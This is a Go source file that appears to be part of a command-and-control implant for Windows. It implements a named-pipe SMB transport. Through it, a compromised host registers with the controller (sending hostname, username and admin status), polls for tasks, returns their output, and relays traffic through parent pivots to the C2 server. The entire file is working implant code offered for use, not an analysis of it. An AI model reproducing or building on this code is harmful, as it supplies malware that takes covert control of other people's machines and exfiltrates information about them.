//go:build windows

package agent

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"sync"
	"syscall"
	"unsafe"
)

const (
	NMPWAIT_WAIT_FOREVER = 0xffffffff
)

var (
	procWaitNamedPipeW = syscall.NewLazyDLL("kernel32.dll").NewProc("WaitNamedPipeW")
)

type pipeConn struct {
	handle syscall.Handle
}

func (p *pipeConn) Read(b []byte) (int, error) {
	var n uint32
	err := syscall.ReadFile(p.handle, b, &n, nil)
	return int(n), err
}

func (p *pipeConn) Write(b []byte) (int, error) {
	var n uint32
	err := syscall.WriteFile(p.handle, b, &n, nil)
	return int(n), err
}

func (p *pipeConn) Close() error { return syscall.CloseHandle(p.handle) }

func pipeReadMsg(p *pipeConn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(p, hdr); err != nil {
		return nil, err
	}
	n := binary.LittleEndian.Uint32(hdr)
	if n == 0 || n > 10<<20 {
		return nil, fmt.Errorf("invalid msg len: %d", n)
	}
	buf := make([]byte, n)
	_, err := io.ReadFull(p, buf)
	return buf, err
}

func pipeWriteMsg(p *pipeConn, data []byte) error {
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
	if _, err := p.Write(hdr); err != nil {
		return err
	}
	_, err := p.Write(data)
	return err
}

type smbClientTransport struct {
	pipe    *pipeConn
	agentID string
	aesKey  []byte
	mu      sync.Mutex // serializes all pipe operations (beacon, result, relay)
}

func newSMBTransport(pipeName string) (*smbClientTransport, error) {
	if len(pipeName) < 9 || pipeName[:9] != `\\.\pipe\` {
		pipeName = `\\.\pipe\` + pipeName
	}
	pipeW, err := syscall.UTF16PtrFromString(pipeName)
	if err != nil {
		return nil, err
	}
	procWaitNamedPipeW.Call(uintptr(unsafe.Pointer(pipeW)), uintptr(NMPWAIT_WAIT_FOREVER))
	h, err := syscall.CreateFile(pipeW,
		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
		0, nil, syscall.OPEN_EXISTING, 0, 0)
	if err != nil {
		return nil, fmt.Errorf("open pipe %s: %w", pipeName, err)
	}
	return &smbClientTransport{pipe: &pipeConn{handle: h}}, nil
}

func (t *smbClientTransport) register(info sysInfo) error {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]any{
		"type": "REGISTER", "hostname": info.Hostname,
		"username": info.Username, "os": info.OS, "pid": info.PID,
		"is_admin": info.IsAdmin,
	}
	data, _ := json.Marshal(req)
	if err := pipeWriteMsg(t.pipe, data); err != nil {
		return err
	}
	resp, err := pipeReadMsg(t.pipe)
	if err != nil {
		return err
	}
	var reg struct {
		AgentID string `json:"agent_id"`
		AESKey  string `json:"aes_key"`
	}
	if err := json.Unmarshal(resp, &reg); err != nil {
		return err
	}
	t.agentID = reg.AgentID
	t.aesKey, _ = base64.StdEncoding.DecodeString(reg.AESKey)
	return nil
}

func (t *smbClientTransport) beacon() ([]taskWire, error) {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]string{"type": "BEACON", "agent_id": t.agentID}
	data, _ := json.Marshal(req)
	if err := pipeWriteMsg(t.pipe, data); err != nil {
		return nil, err
	}
	resp, err := pipeReadMsg(t.pipe)
	if err != nil {
		return nil, err
	}
	if len(resp) == 0 || string(resp) == "null" {
		return nil, nil
	}
	var tasks []taskWire
	json.Unmarshal(resp, &tasks)
	return tasks, nil
}

func (t *smbClientTransport) sendResult(taskID int64, output, errStr string) error {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]any{
		"type": "RESULT", "task_id": taskID,
		"output": output, "error": errStr, "agent_id": t.agentID,
	}
	data, _ := json.Marshal(req)
	return pipeWriteMsg(t.pipe, data)
}

// rawForward sends a RELAY request to the parent pivot and returns the HTTP response.
// This enables N-hop pivot chaining: SMB agent → parent pivot → C2.
func (t *smbClientTransport) rawForward(method, path string, body []byte) (int, []byte, error) {
	t.mu.Lock()
	defer t.mu.Unlock()
	req := map[string]any{
		"type":     "RELAY",
		"method":   method,
		"path":     path,
		"body_b64": base64.StdEncoding.EncodeToString(body),
	}
	data, _ := json.Marshal(req)
	if err := pipeWriteMsg(t.pipe, data); err != nil {
		return 0, nil, err
	}
	resp, err := pipeReadMsg(t.pipe)
	if err != nil {
		return 0, nil, err
	}
	var r struct {
		Status int    `json:"status"`
		Body   string `json:"body_b64"`
	}
	if err := json.Unmarshal(resp, &r); err != nil {
		return 0, nil, err
	}
	bodyBytes, _ := base64.StdEncoding.DecodeString(r.Body)
	return r.Status, bodyBytes, nil
}

func (t *smbClientTransport) uploadFile(_ int64, _ string, _ []byte) error {
	return fmt.Errorf("SMB: uploadFile not supported")
}

func (t *smbClientTransport) downloadFile(_ string) ([]byte, error) {
	return nil, fmt.Errorf("SMB: downloadFile not supported")
}
